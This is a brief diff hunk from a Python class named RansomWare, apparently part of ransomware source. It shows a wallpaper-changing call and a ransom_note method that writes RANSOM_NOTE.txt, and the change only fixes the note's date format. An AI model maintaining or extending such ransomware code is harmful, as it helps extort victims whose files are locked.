@@ -130,7 +130,7 @@ class RansomWare:
         ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
 
     def ransom_note(self):
-        date = datetime.date.today().strftime('%d-%B-Y')
+        date = datetime.date.today().strftime('%d %B %Y')
         with open('RANSOM_NOTE.txt', 'w') as f:
             f.write(f'''
 {date}
